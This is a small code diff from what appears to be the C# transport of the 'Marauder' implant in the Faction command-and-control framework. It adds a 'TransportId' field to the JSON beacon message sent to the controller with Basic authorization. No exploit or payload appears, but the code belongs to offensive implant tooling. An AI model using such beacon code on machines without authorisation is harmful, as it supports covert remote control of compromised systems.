@@ -56,7 +56,7 @@ namespace Faction.Modules.Dotnet
       wc.Headers[HttpRequestHeader.Authorization] = String.Format("Basic {0}", authHeader);
 
       Dictionary<string, string> responseDict = new Dictionary<string, string>();
-      string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
+      string jsonMessage = $"{{\"TransportId\": 1,\"Message\": \"{Message}\"}}";
       try
       {
 #if DEBUG
@@ -98,7 +98,7 @@ namespace Faction.Modules.Dotnet
       {
         try
         {
-          string jsonMessage = $"{{\"Message\": \"{Message}\"}}";
+          string jsonMessage = $"{{\"TransportId\": 1,\"Message\": \"{Message}\"}}";
 
 #if DEBUG
           Console.WriteLine($"[Marauder DIRECT Transport] Beacon URL: {beaconUrl}");
